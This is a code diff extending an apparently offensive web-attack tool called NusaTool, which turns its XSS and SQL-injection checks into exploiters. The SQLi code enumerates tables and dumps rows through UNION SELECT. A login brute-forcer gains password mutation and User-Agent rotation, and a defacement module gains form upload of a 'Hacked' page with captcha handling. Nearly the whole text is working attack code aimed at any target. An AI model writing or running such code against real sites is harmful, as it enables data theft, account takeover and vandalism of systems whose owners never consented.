-    def _test(self, param, payload):
+    def _req(self, param, payload):
         try:
-            new = {k: payload if k == param else v[0] for k, v in parse_qs(urlparse(self.url).query).items()}
-            u = f"{urlparse(self.url).scheme}://{urlparse(self.url).netloc}{urlparse(self.url).path}?{urllib.parse.urlencode(new)}"
-            r = self.bypass.get(u, timeout=10) if self.method == "GET" else self.bypass.post(self.url, data={param: payload}, timeout=10)
-            return (True, u) if payload.lower() in (r.text or "").lower() else (False, None)
-        except requests.RequestException:
-            return (False, None)
-        except Exception:
-            return (False, None)
+            if self.method == "GET":
+                new = {k: payload if k == param else v[0] for k, v in parse_qs(urlparse(self.url).query).items()}
+                u = f"{urlparse(self.url).scheme}://{urlparse(self.url).netloc}{urlparse(self.url).path}?{urllib.parse.urlencode(new)}"
+                r = self.bypass.get(u, timeout=10)
+                return r, u
+            else:
+                r = self.bypass.post(self.url, data={param: payload}, timeout=10)
+                return r, self.url
+        except: return None, None
     def run(self):
-        header("XSS EXPLOIT CHECK")
+        header("XSS EXPLOITER — PROOF OF CONCEPT")
         print(f"  {C}◉{N} URL: {Y}{self.url}{N}")
         print(f"  {self.bypass.info()}{N}")
         if self.bypass.connect_error:
-            print(f"  {R}✘{N} Target unreachable — aborting.\n")
-            return []
-        params = self._get_params() if not self.param else [self.param]
+            print(f"\n  {R}✘{N} Target unreachable.\n"); return []
+        params = [self.param] if self.param else self._get_params()
         if not params: print(f"  {R}✘{N} No params.\n"); return []
-        all_p = self.payloads + self.bp; total = len(params) * len(all_p); done = 0
+        print(f"  {C}◉{N} Params: {Y}{', '.join(params)}{N}")
+        print(f"\n  {BOLD}{C}PHASE 1: INJECT & REFLECT CHECK{N}")
         for param in params:
-            for payload in all_p:
-                done += 1
-                if done % 10 == 0: print(f"  {D}[{done}/{total}]{N}", end="\r")
-                ok, u = self._test(param, payload)
-                if ok: self.vulns.append({"parameter": param, "payload": payload, "url": u or self.url})
-        if self.vulns:
-            print(f"\n\n  {R}{BOLD}⚠ {len(self.vulns)} XSS found!{N}")
-            ptable(["#","PARAMETER","PAYLOAD"], [[str(i+1),v["parameter"],v["payload"][:38]] for i,v in enumerate(self.vulns)], colors=[R]*len(self.vulns))
-        else: print(f"\n  {G}✔{N} No XSS.")
+            for payload in self.payloads:
+                marker = self.marker()
+                inject = payload.replace("alert('XSS')", f"alert('{marker}')")
+                r, u = self._req(param, inject)
+                if r is None: continue
+                text = r.text or ""
+                if marker.lower() in text.lower():
+                    # Find exact reflection context
+                    idx = text.lower().find(marker.lower())
+                    start = max(0, idx - 60)
+                    end = min(len(text), idx + len(marker) + 60)
+                    context = text[start:end]
+                    print(f"\n  {R}[!] XSS FOUND{N}  {Y}{param}{N}")
+                    print(f"      {D}PoC URL: {Y}{u}{N}")
+                    print(f"      {D}Payload: {Y}{inject}{N}")
+                    print(f"      {D}Context: {N}")
+                    print(f"      {W}{context.strip()}{N}")
+                    self.vulns.append({"parameter": param, "payload": inject, "url": u, "context": context.strip()[:200]})
+        if not self.vulns:
+            print(f"\n  {Y}⚠{N} No reflected XSS detected.")
+        print(f"\n  {BOLD}{C}PHASE 2: PoC GENERATION{N}")
+        for v in self.vulns:
+            print(f"\n  {C}─── PoC #{self.vulns.index(v)+1} ───{N}")
+            print(f"  {W}<script>fetch('{v['url']}')</script>{N}")
+            print(f"  {D}Or open in browser:{N}")
+            print(f"  {Y}{v['url']}{N}")
         print(); return self.vulns
 
 class SQLiScanner:
     def __init__(self, url, method="GET", param=None, bypass=None):
-        self.url = url; self.method = method; self.param = param
+        self.url = url; self.method = method.upper(); self.param = param
         self.bypass = bypass or BypassEngine(url); self.vulns = []
+        self.injectable_param = None; self.column_count = 0
         self.payloads = ["'","\"","' OR '1'='1","' OR 1=1--","\" OR \"1\"=\"1",
             "1' AND '1'='1","1' AND '1'='2","' UNION SELECT NULL--","' UNION SELECT 1,2,3--",
-            "admin'--","' AND SLEEP(5)--","1' AND SLEEP(5)--","' OR SLEEP(5)--",
             "' UNION SELECT @@version--","' UNION SELECT database()--","' UNION SELECT user()--"]
-        self.bp = ["' OR '1'='1' --+","'/*!*/OR/*!*/'1'='1","'/**/OR/**/1=1--","'OR 1=1#","'||'1'='1",
-            "%27%20OR%20%271%27%3D%271","' UN/**/ION SEL/**/ECT 1,2,3--"]
         self.patterns = ["sql","syntax error","mysql","unclosed quotation","odbc","oracle","postgresql",
             "warning: mysql","invalid query","ora-","mysql_fetch","sqlite","you have an error in your sql"]
     def _get_params(self):
         p = parse_qs(urlparse(self.url).query); return list(p.keys()) if p else []
-    def _test(self, param, payload):
+    def _req(self, param, payload):
+        """Send request with payload in parameter."""
         try:
-            new = {k: payload if k == param else v[0] for k, v in parse_qs(urlparse(self.url).query).items()}
-            u = f"{urlparse(self.url).scheme}://{urlparse(self.url).netloc}{urlparse(self.url).path}?{urllib.parse.urlencode(new)}"
-            r = (self.bypass.get if self.method=="GET" else self.bypass.post)(u, timeout=10, allow_redirects=False) if self.method=="GET" else self.bypass.post(self.url, data={param:payload}, timeout=10, allow_redirects=False)
-            t = r.text.lower()
-            for p in self.patterns:
-                if p in t: return (True, u, f"Error: {p}", payload)
-            if r.status_code in (500, 404, 403): return (True, u, f"HTTP {r.status_code}", payload)
-            return (False, None, None, None)
-        except requests.RequestException:
-            return (False, None, None, None)
-        except Exception:
-            return (False, None, None, None)
+            if self.method == "GET":
+                new = {k: payload if k == param else v[0] for k, v in parse_qs(urlparse(self.url).query).items()}
+                u = f"{urlparse(self.url).scheme}://{urlparse(self.url).netloc}{urlparse(self.url).path}?{urllib.parse.urlencode(new)}"
+                return self.bypass.get(u, timeout=10, allow_redirects=False)
+            else:
+                return self.bypass.post(self.url, data={param: payload}, timeout=10, allow_redirects=False)
+        except: return None
+    def _find_injection(self):
+        """Find which parameter is injectable."""
+        params = [self.param] if self.param else self._get_params()
+        if not params: return None
+        for param in params:
+            for payload in ["'", "\"", "' OR '1'='1--", "1' AND '1'='1--"]:
+                r = self._req(param, payload)
+                if r is None: continue
+                t = r.text.lower() if r.text else ""
+                for p in self.patterns:
+                    if p in t:
+                        self.injectable_param = param
+                        return param
+                if r.status_code in (500, 404, 403):
+                    self.injectable_param = param
+                    return param
+        return None
+    def _find_column_count(self):
+        """Use ORDER BY to find number of columns."""
+        param = self.injectable_param
+        if not param: return 0
+        for cols in range(1, 21):
+            r = self._req(param, f"' ORDER BY {cols}--")
+            if r is None: continue
+            if r.status_code in (500, 404, 403) or (r.text and "error" in r.text.lower()):
+                self.column_count = cols - 1
+                return cols - 1
+            # If ORDER BY 1 succeeds but ORDER BY 2 also succeeds, keep going
+        self.column_count = 1  # fallback
+        return 1
+    def _union_select(self, param, cols, select_expr):
+        """Execute UNION SELECT and return the response text."""
+        payload = f"' UNION SELECT {select_expr}--"
+        r = self._req(param, payload)
+        if r is None: return ""
+        return r.text
+    def _extract_data(self, select_expr):
+        """Extract data via UNION SELECT."""
+        param = self.injectable_param
+        cols = self.column_count
+        if not param or cols < 1: return []
+        # Build padded SELECT with NULLs
+        parts = select_expr.split(",") if "," in select_expr else [select_expr]
+        if len(parts) < cols:
+            parts = parts + ["NULL"] * (cols - len(parts))
+        elif len(parts) > cols:
+            parts = parts[:cols]
+        expr = ",".join(parts)
+        text = self._union_select(param, cols, expr)
+        if not text: return []
+        # Try to find data in the response HTML body
+        body = text
+        bm = re.search(r'<body[^>]*>(.*?)</body>', text, re.I | re.S)
+        if bm: body = bm.group(1)
+        # Strip HTML tags
+        clean = re.sub(r'<[^>]+>', ' ', body)
+        clean = re.sub(r'\s+', ' ', clean).strip()
+        # Split by common delimiters used in UNION SELECT output
+        parts_out = re.split(r'[,\s]+', clean)
+        return [p for p in parts_out if p and len(p) < 200]
     def run(self):
-        header("SQL INJECTION EXPLOIT CHECK")
+        header("SQL INJECTION EXPLOITER")
         print(f"  {C}◉{N} URL: {Y}{self.url}{N}")
         print(f"  {self.bypass.info()}{N}")
         if self.bypass.connect_error:
-            print(f"  {R}✘{N} Target unreachable — aborting.\n")
+            print(f"\n  {R}✘{N} Target unreachable.\n"); return []
+        params = [self.param] if self.param else self._get_params()
+        if not params: print(f"  {R}✘{N} No parameters.\n"); return []
+        print(f"  {C}◉{N} Parameters: {Y}{', '.join(params)}{N}")
+        print(f"\n  {BOLD}{C}PHASE 1: DETECT INJECTION{N}")
+        inj = self._find_injection()
+        if not inj:
+            print(f"  {R}✘{N} No SQL injection detected.\n")
             return []
-        params = self._get_params() if not self.param else [self.param]
-        if not params: print(f"  {R}✘{N} No params.\n"); return []
-        all_p = self.payloads + self.bp; total = len(params) * len(all_p); done = 0
-        for param in params:
-            for payload in all_p:
-                done += 1
-                if done % 10 == 0: print(f"  {D}[{done}/{total}]{N}", end="\r")
-                ok, u, t, p = self._test(param, payload)
-                if ok: self.vulns.append({"parameter": param, "payload": p, "type": t, "url": u or self.url})
-        if self.vulns:
-            print(f"\n\n  {R}{BOLD}⚠ {len(self.vulns)} SQLi found!{N}")
-            ptable(["#","PARAMETER","TYPE","PAYLOAD"], [[str(i+1),v["parameter"],v["type"],v["payload"][:28]] for i,v in enumerate(self.vulns)], colors=[R]*len(self.vulns))
-        else: print(f"\n  {G}✔{N} No SQLi.")
-        print(); return self.vulns
+        print(f"  {G}✔{N} Injectable parameter: {Y}{inj}{N}")
+        print(f"\n  {BOLD}{C}PHASE 2: COLUMN COUNT{N}")
+        cols = self._find_column_count()
+        if cols < 1:
+            print(f"  {Y}⚠{N} Could not determine column count, using 1.")
+            cols = 1
+        print(f"  {G}✔{N} Columns: {Y}{cols}{N}")
+        print(f"\n  {BOLD}{C}PHASE 3: DATABASE FINGERPRINT{N}")
+        for name, expr in [("Version", "@@version"), ("Database", "database()"), ("User", "user()")]:
+            data = self._extract_data(expr)
+            if data:
+                print(f"  {G}•{N} {name}: {Y}{' '.join(data[:5])}{N}")
+        print(f"\n  {BOLD}{C}PHASE 4: TABLE ENUMERATION{N}")
+        # MySQL: list tables from information_schema
+        tbl_expr = "group_concat(table_name SEPARATOR '|') FROM information_schema.tables WHERE table_schema=database()"
+        data = self._extract_data(tbl_expr)
+        tables = []
+        if data:
+            raw = " ".join(data)
+            tables = [t.strip() for t in raw.replace("|", " ").split() if t.strip() and len(t.strip()) < 50]
+            if tables:
+                print(f"  {G}✔{N} Tables ({len(tables)}): {Y}{', '.join(tables[:15])}{N}")
+                if len(tables) > 15:
+                    print(f"      {D}... and {len(tables)-15} more{N}")
+        if not tables:
+            print(f"  {Y}⚠{N} Could not enumerate tables (may need manual exploitation).")
+        print(f"\n  {BOLD}{C}PHASE 5: DATA EXTRACTION{N}")
+        extracted = 0
+        for table in tables[:5]:
+            # Get columns for this table
+            col_expr = f"group_concat(column_name SEPARATOR '|') FROM information_schema.columns WHERE table_name='{table}'"
+            col_data = self._extract_data(col_expr)
+            cols_list = []
+            if col_data:
+                raw = " ".join(col_data)
+                cols_list = [c.strip() for c in raw.replace("|", " ").split() if c.strip() and len(c.strip()) < 50]
+            if not cols_list:
+                cols_list = ["*"]
+            # Dump first 3 rows
+            sel_cols = ",".join(cols_list[:5]) if cols_list != ["*"] else "*"
+            row_expr = f"group_concat({sel_cols} SEPARATOR '|') FROM {table} LIMIT 3"
+            row_data = self._extract_data(row_expr)
+            if row_data:
+                raw = " ".join(row_data)
+                rows_raw = raw.replace("|", " | ").split()
+                rows = [r for r in rows_raw if r.strip() and len(r.strip()) < 200]
+                if rows:
+                    extracted += 1
+                    print(f"  {G}•{N} {Y}{table}{N} ({len(cols_list)} cols, {len(rows)} vals): {D}{' '.join(cols_list[:5])}{N}")
+                    print(f"      {Y}{' '.join(rows[:10])}{N}")
+                    if len(rows) > 10:
+                        print(f"      {D}... +{len(rows)-10} more{N}")
+        if extracted == 0:
+            print(f"  {Y}⚠{N} Could not extract data (UNION SELECT may not work on this target).")
+        print()
+        return self.vulns
 
 class SubdomainEnumerator:
     def __init__(self, domain, wordlist=None, threads=20):
@@ -1081,45 +1278,87 @@ class LoginBruteforcer:
                 return m.group(1)
         return None
 
+    def _mutate(self, password):
+        """Generate password mutations."""
+        yield password  # Original
+        yield password.capitalize()
+        yield password.upper()
+        yield password.lower()
+        yield password + "!"
+        yield password + "123"
+        yield password + "123!"
+        yield password + "@"
+        yield password + "2024"
+        yield password + "2025"
+        yield password + "2026"
+        yield password[0].upper() + password[1:] if len(password) > 1 else password
+        # Leet speak substitutions
+        leet = str(password)
+        for a, b in [("a","@"),("a","4"),("e","3"),("i","1"),("o","0"),("s","$"),("s","5"),("t","7")]:
+            if a in leet:
+                yield leet.replace(a, b)
+
     def _try(self, u, p):
-        try:
-            data = {}
-            if self.mode == "json":
-                data = {self.ufield: u, self.pfield: p}
-                if self.csrf_token:
-                    data[self.csrf_field] = self.csrf_token
-                r = self.session.post(self.url, json=data, timeout=10, allow_redirects=False)
-            elif self.mode == "basic":
-                r = self.session.get(self.url, auth=(u, p), timeout=10, allow_redirects=False)
-            elif self.mode == "bearer":
-                headers = {"Authorization": f"Bearer {p}"}
-                r = self.session.get(self.url, headers=headers, timeout=10, allow_redirects=False)
-            else:
-                csrf = self.csrf_token
-                if not csrf and self.method == "POST":
-                    try:
-                        gr = self.session.get(self.url, timeout=8)
-                        csrf = self._extract_csrf(gr.text)
-                    except: pass
-                data[self.ufield] = u
-                data[self.pfield] = p
-                if csrf:
-                    data[self.csrf_field] = csrf
-
-                if self.method == "POST":
-                    r = self.session.post(self.url, data=data, timeout=10, allow_redirects=False)
+        for attempt_pwd in set(self._mutate(p)):
+            try:
+                data = {}
+                hdrs = {"User-Agent": random.choice(self.bypass.ua_list)} if hasattr(self.bypass, 'ua_list') else {}
+                if self.mode == "json":
+                    data = {self.ufield: u, self.pfield: attempt_pwd}
+                    if self.csrf_token: data[self.csrf_field] = self.csrf_token
+                    r = self.session.post(self.url, json=data, headers=hdrs, timeout=10, allow_redirects=False)
+                elif self.mode == "basic":
+                    r = self.session.get(self.url, auth=(u, attempt_pwd), headers=hdrs, timeout=10, allow_redirects=False)
+                elif self.mode == "bearer":
+                    hdrs["Authorization"] = f"Bearer {attempt_pwd}"
+                    r = self.session.get(self.url, headers=hdrs, timeout=10, allow_redirects=False)
                 else:
-                    r = self.session.get(self.url, params=data, timeout=10, allow_redirects=False)
+                    csrf = self.csrf_token
+                    if not csrf and self.method == "POST":
+                        try:
+                            gr = self.session.get(self.url, timeout=8)
+                            csrf = self._extract_csrf(gr.text)
+                        except: pass
+                    data[self.ufield] = u
+                    data[self.pfield] = attempt_pwd
+                    if csrf: data[self.csrf_field] = csrf
+                    if self.method == "POST":
+                        r = self.session.post(self.url, data=data, headers=hdrs, timeout=10, allow_redirects=False)
+                    else:
+                        r = self.session.get(self.url, params=data, headers=hdrs, timeout=10, allow_redirects=False)
 
-            # Multi-method success detection
-            if self.fail and self.fail.lower() not in r.text.lower():
-                return True
-            if r.status_code in (302, 307, 308) and "login" not in r.headers.get("Location", "").lower():
-                return True
-            if r.status_code == 200 and self.fail and self.fail.lower() not in r.text.lower():
-                return True
-            return False
-        except: return False
+                # Success detection
+                text = r.text.lower()
+                # Redirect away from login → success
+                if r.status_code in (301, 302, 307, 308):
+                    loc = r.headers.get("Location", "").lower()
+                    if "login" not in loc:
+                        self.creds.append({"username": u, "password": attempt_pwd})
+                        return True
+                # JSON response with success
+                if r.text.strip().startswith("{"):
+                    try:
+                        j = json.loads(r.text)
+                        if j.get("status") == "success":
+                            self.creds.append({"username": u, "password": attempt_pwd})
+                            return True
+                    except: pass
+                # Keyword-based detection
+                fail_keywords = [self.fail.lower()] if self.fail else []
+                fail_keywords += ["invalid", "wrong", "failed", "error", "incorrect", "not found"]
+                success_keywords = ["welcome", "dashboard", "logout", "success", "selamat datang"]
+                has_fail = any(kw in text for kw in fail_keywords if kw)
+                has_success = any(kw in text for kw in success_keywords)
+                if has_success and not has_fail:
+                    self.creds.append({"username": u, "password": attempt_pwd})
+                    return True
+                # Custom fail string not found + status != 401/403
+                if self.fail and self.fail.lower() not in text and r.status_code not in (401, 403):
+                    self.creds.append({"username": u, "password": attempt_pwd})
+                    return True
+                return False
+            except: continue
+        return False
 
     def _worker(self, q):
         while True:
@@ -1129,8 +1368,10 @@ class LoginBruteforcer:
                 break
             if self._try(u, p):
                 with self.lock:
-                    self.creds.append({"username": u, "password": p})
-                    print(f"\n  {G}{BOLD}[SUCCESS]{N} {Y}{u}{N} : {Y}{p}{N}")
+                    # _try already added to creds, just print the last found
+                    last = self.creds[-1] if self.creds else None
+                    if last:
+                        print(f"\n  {G}{BOLD}[SUCCESS]{N} {Y}{last['username']}{N} : {Y}{last['password']}{N}")
             with self.lock:
                 self.done += 1
                 if self.done % max(1, self.total // 100) == 0 or self.done == self.total:
@@ -1877,8 +2118,102 @@ class DefaceTester:
         print()
         return self.vulns
 
-    def deface(self, filepath=None, content=None):
+    def _submit_form(self, content, fname, captcha_answer=None):
+        """Submit detected upload form with deface content (handles Kleeja captcha)."""
+        try:
+            r = self.bypass.get(self.url, timeout=15)
+            html = r.text
+        except Exception as e:
+            print(f"  {R}[✘]{N} Failed to fetch form page: {e}")
+            return None
+
+        fs = html.find("<form")
+        if fs == -1:
+            return None
+        fe = html.find("</form>", fs)
+        if fe == -1:
+            return None
+        form = html[fs:fe+7]
+
+        am = re.search(r'action=["\']([^"\']*)["\']', form[:500], re.I)
+        action = am.group(1) if am else ""
+
+        form_data = {}
+        file_field = None
+        for inp in re.finditer(r'<input[^>]+>', form, re.I):
+            nm = (re.search(r'name=["\']([^"\']+)["\']', inp.group(), re.I) or [None, None]).group(1)
+            if not nm: continue
+            typ = (re.search(r'type=["\']([^"\']+)["\']', inp.group(), re.I) or [None, "text"]).group(1).lower()
+            if typ == "file":
+                file_field = nm
+            elif typ == "hidden":
+                vm = re.search(r'value=["\']([^"\']*)["\']', inp.group(), re.I)
+                form_data[nm] = vm.group(1) if vm else ""
+            elif typ == "submit":
+                vm = re.search(r'value=["\']([^"\']*)["\']', inp.group(), re.I)
+                form_data[nm] = vm.group(1) if vm else "submit"
+            elif typ == "text":
+                vm = re.search(r'value=["\']([^"\']*)["\']', inp.group(), re.I)
+                form_data[nm] = vm.group(1) if vm else ""
+
+        captcha_img = re.search(r'<img[^>]+src=["\']([^"\']*captcha[^"\']*)["\']', html, re.I)
+        if captcha_img:
+            img_url = urljoin(self.url, captcha_img.group(1))
+            try:
+                img_data = requests.get(img_url, timeout=10, verify=False,
+                    headers={"User-Agent": "Mozilla/5.0"}).content
+                captcha_path = "/tmp/nusatool_captcha.png"
+                with open(captcha_path, "wb") as f:
+                    f.write(img_data)
+                print(f"\n  {Y}[!]{N} {BOLD}CAPTCHA DETECTED{N}")
+                print(f"  {D}Image saved to: {Y}{captcha_path}{N}")
+                if captcha_answer:
+                    answer = captcha_answer
+                else:
+                    try:
+                        answer = input(f"  {Y}Captcha text{N} > ").strip()
+                    except (EOFError, OSError):
+                        print(f"  {R}✘{N} Interactive input unavailable. Use --captcha <answer>")
+                        return None
+                for inp in re.finditer(r'<input[^>]+>', form, re.I):
+                    nm = (re.search(r'name=["\']([^"\']+)["\']', inp.group(), re.I) or [None, None]).group(1)
+                    if nm and any(k in nm.lower() for k in ["captcha", "kleeja", "code", "answer"]):
+                        form_data[nm] = answer
+            except Exception as e:
+                print(f"  {R}[✘]{N} Captcha error: {e}")
+                return None
+
+        if not file_field:
+            print(f"  {R}[✘]{N} No file input field found in form")
+            return None
+
+        action_url = urljoin(self.url, action) if action else self.url
+        files_payload = {file_field: (fname, content, "text/html")}
+        try:
+            print(f"  {C}▶{N} Submitting form to {Y}{action_url}{N}")
+            r2 = requests.post(action_url, data=form_data, files=files_payload,
+                timeout=15, verify=False,
+                headers={"User-Agent": "Mozilla/5.0"})
+            if r2.status_code in (200, 201, 204, 302, 301):
+                verify_url = urljoin(self.url.rstrip("/") + "/", fname)
+                r3 = requests.get(verify_url, timeout=8, verify=False)
+                if r3.status_code == 200 and len(r3.text) > 50:
+                    print(f"  {G}[✔]{N} {BOLD}FORM UPLOAD SUCCESS{N} {Y}{verify_url}{N}")
+                    return {"method": "FORM", "url": verify_url}
+                link = re.search(r'href=["\']([^"\']*)' + re.escape(fname), r2.text, re.I)
+                if link:
+                    lurl = urljoin(self.url, link.group(1))
+                    print(f"  {G}[✔]{N} {BOLD}FORM UPLOAD{N} {Y}{lurl}{N}")
+                    return {"method": "FORM", "url": lurl}
+                print(f"  {Y}[?]{N} Form submitted but could not verify. Check manually.")
+                return {"method": "FORM", "url": action_url}
+        except Exception as e:
+            print(f"  {R}[✘]{N} Form submission failed: {e}")
+        return None
+
+    def deface(self, filepath=None, content=None, captcha_answer=None):
         """Scan + actual upload of deface content."""
+        self._captcha_answer = captcha_answer
         if not filepath and not content:
             content = f"""<!DOCTYPE html><html><head><title>Hacked</title><style>
 body {{ background:#000; color:#0f0; text-align:center; padding-top:20vh; font-family:monospace; }}
@@ -1964,6 +2299,13 @@ h1 {{ font-size:4em; }} blink {{ font-size:1.5em; }}</style></head>
                 except Exception as e:
                     print(f"  {R}[✘]{N} Bypass upload failed: {e}")
 
+        # 4) Upload form (Kleeja / CMS forms) — interactive captcha if needed
+        for v in self.vulns:
+            if "Upload Form" in v["type"]:
+                res = self._submit_form(content, fname, getattr(self, '_captcha_answer', None))
+                if res:
+                    uploaded.append(res)
+
         print(f"\n  {D}{'─'*50}{N}")
         if uploaded:
             print(f"  {G}{BOLD}✔ {len(uploaded)} file(s) deployed!{N}")
@@ -1979,58 +2321,144 @@ h1 {{ font-size:4em; }} blink {{ font-size:1.5em; }}</style></head>
 # ══════════════════════════════════════════════════════
 
 class ReportGenerator:
-    def generate_json(self, data, f="nusatool_report.json"):
-        with open(f, "w") as fp: json.dump(data, fp, indent=2, default=str)
+    def __init__(self):
+        self.findings = []
+        self.target = ""
+        self.start_time = datetime.datetime.now()
+        self.phases = []
+
+    def add(self, finding):
+        self.findings.append(finding)
+
+    def add_phase(self, name, status, detail=""):
+        self.phases.append({"name": name, "status": status, "detail": detail, "time": (datetime.datetime.now()-self.start_time).total_seconds()})
+
+    def generate_json(self, data=None, f="nusatool_report.json"):
+        d = data or {"target": self.target, "findings": self.findings, "phases": self.phases, "generated": str(self.start_time)}
+        with open(f, "w") as fp: json.dump(d, fp, indent=2, default=str)
         print(f"  {G}✔{N} JSON report saved to {Y}{f}{N}")
 
+    def generate_csv(self, f="nusatool_report.csv"):
+        import csv
+        with open(f, "w", newline="") as fp:
+            w = csv.writer(fp)
+            w.writerow(["Type", "Target", "Detail", "Severity", "Timestamp"])
+            for v in self.findings:
+                w.writerow([v.get("type",""), v.get("target",""), v.get("detail",""), v.get("severity","info"), v.get("time","")])
+        print(f"  {G}✔{N} CSV report saved to {Y}{f}{N}")
+
     def generate_html(self, f="nusatool_report.html", data=None):
-        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        findings = ""
-        if data and data.get("vulns"):
-            for i, v in enumerate(data["vulns"], 1):
-                findings += f"<tr><td>{i}</td><td>{escape(v.get('type','?'))}</td><td>{escape(v.get('param','?'))}</td><td>{escape(v.get('payload','')[:40])}</td><td><span class='badge badge-high'>High</span></td></tr>\n"
+        ts = self.start_time.strftime("%Y-%m-%d %H:%M:%S")
+        d = data or {"target": self.target, "findings": self.findings, "phases": self.phases}
+        vulns = d.get("findings") or []
+        phases = d.get("phases") or []
+        sev_dist = {"critical":0,"high":0,"medium":0,"low":0,"info":0}
+        findings_rows = ""
+        for i, v in enumerate(vulns, 1):
+            sev = v.get("severity","info").lower()
+            sev_dist[sev] = sev_dist.get(sev,0)+1
+            badge = {"critical":"badge-crit","high":"badge-high","medium":"badge-med","low":"badge-low","info":"badge-info"}.get(sev,"badge-info")
+            findings_rows += f"<tr><td>{i}</td><td>{escape(v.get('type','?'))}</td><td>{escape(v.get('target',''))}</td><td>{escape(v.get('detail','')[:80])}</td><td><span class='{badge}'>{sev.title()}</span></td></tr>\n"
+        phases_rows = ""
+        for p in phases:
+            sc = {"ok":"🟢","fail":"🔴","skip":"⏭️","warn":"🟡"}.get(p.get("status",""),"⚪")
+            phases_rows += f"<tr><td>{sc}</td><td>{escape(p.get('name',''))}</td><td>{escape(p.get('detail',''))}</td><td>{p.get('time',0):.1f}s</td></tr>\n"
+        # Mini chart bars
+        total = sum(sev_dist.values()) or 1
+        bars = "".join(f"<div style='display:flex;align-items:center;margin:4px 0'><span style='width:80px;color:#8899aa'>{k.title()}</span><div style='flex:1;background:#1a1f3a;border-radius:4px;height:20px'><div style='width:{v/total*100}%;background:{'#ff2222' if k=='critical' else '#ff4444' if k=='high' else '#ffaa00' if k=='medium' else '#44cc44' if k=='low' else '#6688cc'};height:20px;border-radius:4px'></div></div><span style='width:40px;text-align:right;color:#e0e0e0'>{v}</span></div>" for k,v in sev_dist.items())
         html = f"""<!DOCTYPE html><html lang="en">
-<head><meta charset="UTF-8"><title>NusaTool Report</title>
-<style>*{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:'Segoe UI',sans-serif;background:#0a0e1a;color:#e0e0e0}}
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>NusaTool Report</title>
+<style>*{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:'Segoe UI',sans-serif;background:#0a0e1a;color:#e0e0e0;font-size:14px}}
 .container{{max-width:1100px;margin:0 auto;padding:20px}}
-.hdr{{background:linear-gradient(135deg,#1a1f3a,#0d1b2a);padding:40px;border-radius:10px;text-align:center;border:1px solid #2a3f5f}}
-.hdr h1{{color:#00d4ff;font-size:2.5em}}.hdr p{{color:#8899aa}}
+.hdr{{background:linear-gradient(135deg,#1a1f3a,#0d1b2a);padding:40px;border-radius:12px;text-align:center;border:1px solid #2a3f5f;margin-bottom:20px}}
+.hdr h1{{color:#00d4ff;font-size:2.2em;letter-spacing:2px}}.hdr p{{color:#8899aa;margin-top:5px}}
+.grid{{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:12px;margin-top:15px}}
+.stat-box{{background:#1a1f3a;padding:15px;border-radius:8px;text-align:center;border:1px solid #2a3f5f}}
+.stat-box .num{{font-size:1.8em;font-weight:700;color:#00d4ff}}
+.stat-box .lbl{{color:#8899aa;font-size:.85em;margin-top:4px}}
 .section{{background:#111827;border:1px solid #1e293b;border-radius:10px;padding:25px;margin:20px 0}}
-.section h2{{color:#00d4ff;border-bottom:1px solid #1e293b;padding-bottom:10px}}
-table{{width:100%;border-collapse:collapse;margin-top:15px}}
-th{{background:#1a1f3a;color:#00d4ff;padding:12px;text-align:left}}
-td{{padding:10px 12px;border-bottom:1px solid #1e293b}}
-.badge{{display:inline-block;padding:3px 10px;border-radius:12px;font-size:.85em}}
+.section h2{{color:#00d4ff;border-bottom:1px solid #1e293b;padding-bottom:10px;margin-bottom:15px}}
+table{{width:100%;border-collapse:collapse}}
+th{{background:#1a1f3a;color:#00d4ff;padding:10px 12px;text-align:left;font-size:.85em;text-transform:uppercase;letter-spacing:1px}}
+td{{padding:8px 12px;border-bottom:1px solid #1e293b;font-size:.9em}}
+tr:hover td{{background:#1a1f3a70}}
+.badge-crit,.badge-high,.badge-med,.badge-low,.badge-info{{display:inline-block;padding:2px 10px;border-radius:10px;font-size:.8em;font-weight:600}}
+.badge-crit{{background:#ff2222;color:#fff}}
 .badge-high{{background:#ff4444;color:#fff}}
 .badge-med{{background:#ffaa00;color:#1a1f3a}}
-.badge-low{{background:#00aa44;color:#fff}}
-.footer{{text-align:center;padding:30px;color:#556;font-size:.85em}}
-pre{{background:#1a1f3a;padding:15px;border-radius:6px;overflow-x:auto;color:#00d4ff}}</style></head>
+.badge-low{{background:#44cc44;color:#fff}}
+.badge-info{{background:#6688cc;color:#fff}}
+.footer{{text-align:center;padding:30px;color:#445;font-size:.8em}}
+pre{{background:#1a1f3a;padding:12px;border-radius:6px;overflow-x:auto;color:#00d4ff;font-size:.85em}}
+@media(max-width:600px){{.grid{{grid-template-columns:1fr 1fr}}}}</style></head>
 <body><div class="container">
-<div class="hdr"><h1>NusaTool</h1><p>Hack Audit Report</p><p style="font-size:.9em;margin-top:10px">{ts}</p></div>
-<div class="section"><h2>Summary</h2>
-<div style="display:grid;grid-template-columns:1fr 1fr;gap:15px;margin-top:15px">
-<div style="background:#1a1f3a;padding:12px;border-radius:6px"><div style="color:#8899aa">Tool</div><div style="font-weight:600">NusaTool v{VERSION}</div></div>
-<div style="background:#1a1f3a;padding:12px;border-radius:6px"><div style="color:#8899aa">Date</div><div style="font-weight:600">{ts}</div></div>
-</div></div>
-<div class="section"><h2>Vulnerabilities</h2>
-<table><thead><tr><th>#</th><th>Type</th><th>Parameter</th><th>Payload</th><th>Severity</th></tr></thead>
-<tbody>{findings or '<tr><td colspan="5" style="text-align:center;color:#8899aa">No vulnerabilities found</td></tr>'}</tbody></table></div>
-<div class="section"><h2>Modules</h2><table><thead><tr><th>Module</th><th>Description</th><th>Risk</th></tr></thead><tbody>
-<tr><td>AutoPwn</td><td>Automated full pentest (6 phases)</td><td><span class="badge badge-high">High</span></td></tr>
-<tr><td>URL Scanner</td><td>XSS, SQLi, LFI, Redirect, CMDi, SSTI</td><td><span class="badge badge-high">High</span></td></tr>
-<tr><td>CORS Scanner</td><td>Cross-Origin misconfiguration</td><td><span class="badge badge-med">Medium</span></td></tr>
-<tr><td>CSRF Scanner</td><td>Missing CSRF tokens</td><td><span class="badge badge-med">Medium</span></td></tr>
-<tr><td>CVE Checker</td><td>Known vulnerability database</td><td><span class="badge badge-high">High</span></td></tr>
-<tr><td>WAF Bypass</td><td>12+ bypass techniques</td><td><span class="badge badge-med">Medium</span></td></tr>
